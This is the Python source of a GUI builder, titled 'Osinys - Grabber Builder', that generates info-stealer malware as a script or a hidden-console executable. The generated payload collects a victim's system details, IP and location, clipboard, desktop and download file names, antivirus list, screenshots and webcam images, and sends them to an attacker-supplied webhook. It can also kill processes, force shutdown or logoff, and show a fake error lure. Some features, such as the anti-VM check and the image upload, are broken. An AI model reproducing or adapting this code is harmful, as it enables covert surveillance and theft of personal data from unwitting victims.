import customtkinter as ctk
import requests
import os
import platform
import psutil
import socket
import json
import pyperclip
import pyautogui
import cv2
import subprocess
import tkinter as tk
from tkinter import simpledialog
from tkinter import messagebox

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

class SystemInfoTool(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Osinys - Grabber Builder")
        self.geometry("500x700")

        self.webhook_label = ctk.CTkLabel(self, text="Webhook URL:")
        self.webhook_label.pack(pady=5)

        self.webhook_entry = ctk.CTkEntry(self, width=350)
        self.webhook_entry.pack(pady=5)

        self.test_webhook_btn = ctk.CTkButton(self, text="Test Webhook", command=self.test_webhook)
        self.test_webhook_btn.pack(pady=5)

        self.options_frame = ctk.CTkFrame(self)
        self.options_frame.pack(pady=10, fill="x", padx=20)

        self.options = {
            "System Info": ctk.BooleanVar(),
            "IP Info": ctk.BooleanVar(),
            "Clipboard": ctk.BooleanVar(),
            "Browsers List": ctk.BooleanVar(),
            "Antivirus List": ctk.BooleanVar(),
            "Downloads List": ctk.BooleanVar(),
            "Files on Desktop": ctk.BooleanVar(),
            "Screenshot": ctk.BooleanVar(),
            "Webcam Screen": ctk.BooleanVar(),
            "Kill All Programs": ctk.BooleanVar(),
            "Kill Discord Client": ctk.BooleanVar(),
            "Shutdown": ctk.BooleanVar(),
            "Fake Error": ctk.BooleanVar(),
            "Disconnect User": ctk.BooleanVar()
        }

        row, col = 0, 0
        for name, var in self.options.items():
            ctk.CTkCheckBox(self.options_frame, text=name, variable=var).grid(row=row, column=col, sticky="w", padx=10, pady=2)
            col += 1
            if col > 1:
                col = 0
                row += 1

        self.format_label = ctk.CTkLabel(self, text="Output Format:")
        self.format_label.pack(pady=5)

        self.format_option = ctk.CTkComboBox(self, values=["Python (.py)", "Executable (.exe)"])
        self.format_option.pack(pady=5)

        self.generate_btn = ctk.CTkButton(self, text="Generate", command=self.generate_script)
        self.generate_btn.pack(pady=20)

        self.fake_error_title = ""
        self.fake_error_message = ""

    def test_webhook(self):
        url = self.webhook_entry.get()
        if not url.startswith("http"):
            self.show_message("Invalid Webhook")
            return
        try:
            response = requests.post(url, json={"content": "Webhook Test"})
            if response.status_code == 204:
                self.show_message("Webhook Valid")
            else:
                self.show_message("Invalid Webhook")
        except:
            self.show_message("Invalid Webhook")

    def generate_script(self):
        webhook = self.webhook_entry.get()
        selected_options = [name for name, var in self.options.items() if var.get()]
        
        
        if "Fake Error" in selected_options:
            self.get_fake_error_info()

        script_content = self.create_script_content(webhook, selected_options)

        output_format = self.format_option.get()
        if output_format == "Python (.py)":
            with open("system_info.py", "w", encoding="utf-8") as f:
                f.write(script_content)
            self.show_message("Python Script Generated Successfully.")
        else:
            with open("system_info.py", "w", encoding="utf-8") as f:
                f.write(script_content)
            os.system("pyinstaller --onefile --noconsole system_info.py")
            self.show_message("Executable Generated Successfully.")

    def get_fake_error_info(self):
        """Affiche la fenêtre pour configurer le titre et le message de l'erreur."""
        root = tk.Tk()
        root.withdraw()
        self.fake_error_title = simpledialog.askstring("Error Title", "Enter the error title:")
        self.fake_error_message = simpledialog.askstring("Error Message", "Enter the error message:")

    def create_script_content(self, webhook, options):
        script = f"""import requests
import platform
import socket
import os
import psutil
import pyperclip
import json
import pyautogui
import cv2
import subprocess
import tkinter as tk
from tkinter import simpledialog

webhook = '{webhook}'

def anti_vm():
    vms = ["VirtualBox", "VMware", "Hyper-V", "Parallels"]
    system_info = platform.system()
    for vm in vms:
        if vm in system_info:
            return True
    return False

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

def take_webcam_photo():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("webcam_photo.png", frame)
    cap.release()

def kill_all_programs():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            proc.terminate()  # Ne tue pas les processus, mais les ferme
        except psutil.NoSuchProcess:
            pass

def kill_discord():
    for proc in psutil.process_iter(['pid', 'name']):
        if "discord" in proc.name().lower():
            proc.terminate()

def shutdown():
    os.system("shutdown /s /f /t 1")

def fake_error():
    title = "{self.fake_error_title}"
    message = "{self.fake_error_message}"
    tk.messagebox.showerror(title, message)

def disconnect_user():
    os.system('shutdown -l')

def send_embed(title, fields):
    embed = {{
        "title": title,
        "color": 65280,
        "fields": fields
    }}
    requests.post(webhook, json={{"embeds": [embed]}})



if "System Info" in {options}:
    system_info = [
        {{"name": "Hostname", "value": socket.gethostname(), "inline": True}},
        {{"name": "OS", "value": f"{platform.system()} {platform.release()}", "inline": True}},
        {{"name": "CPU", "value": platform.processor(), "inline": False}},
        {{"name": "RAM", "value": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB", "inline": True}}
    ]
    send_embed("🖥️ System Info", system_info)

if "IP Info" in {options}:
    ip_data = requests.get("https://ipinfo.io/json").json()
    ip_info = [
        {{"name": "IP", "value": ip_data.get("ip", "N/A"), "inline": True}},
        {{"name": "City", "value": ip_data.get("city", "N/A"), "inline": True}},
        {{"name": "Country", "value": ip_data.get("country", "N/A"), "inline": False}},
        {{"name": "ISP", "value": ip_data.get("org", "N/A"), "inline": False}}
    ]
    send_embed("🌍 IP Info", ip_info)

if "Clipboard" in {options}:
    clipboard_text = pyperclip.paste()
    send_embed("📋 Clipboard", [{{"name": "Content", "value": clipboard_text, "inline": False}}])

if "Browsers List" in {options}:
    browsers = ["Chrome", "Firefox", "Edge"]
    installed = [b for b in browsers if any(os.path.exists(os.path.join(p, b)) for p in ["C:\\Program Files", "C:\\Program Files (x86)"])]
    send_embed("🌐 Browsers", [{{"name": "Installed", "value": ', '.join(installed), "inline": False}}])

if "Antivirus List" in {options}:
    av = os.popen("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName").read()
    send_embed("🛡️ Antivirus", [{{"name": "Antivirus List", "value": av, "inline": False}}])

if "Downloads List" in {options}:
    files = '\\n'.join(os.listdir(os.path.expanduser("~/Downloads"))[:10])
    send_embed("📂 Downloads", [{{"name": "Latest Files", "value": files, "inline": False}}])

if "Files on Desktop" in {options}:
    files = '\\n'.join(os.listdir(os.path.expanduser("~/Desktop"))[:10])
    send_embed("🖥️ Desktop Files", [{{"name": "Latest Files", "value": files, "inline": False}}])

if "Screenshot" in {options}:
    take_screenshot()
    send_embed("📸 Screenshot", [{{"name": "Screenshot", "value": "screenshot.png", "inline": False}}])

if "Webcam Screen" in {options}:
    take_webcam_photo()
    send_embed("📷 Webcam Photo", [{{"name": "Photo", "value": "webcam_photo.png", "inline": False}}])

if "Kill All Programs" in {options}:
    kill_all_programs()

if "Kill Discord Client" in {options}:
    kill_discord()

if "Shutdown" in {options}:
    shutdown()

if "Fake Error" in {options}:
    fake_error()

if "Disconnect User" in {options}:
    disconnect_user()
"""
        return script

    def show_message(self, message):
        messagebox.showinfo("Info", message)

if __name__ == "__main__":
    app = SystemInfoTool()
    app.mainloop()
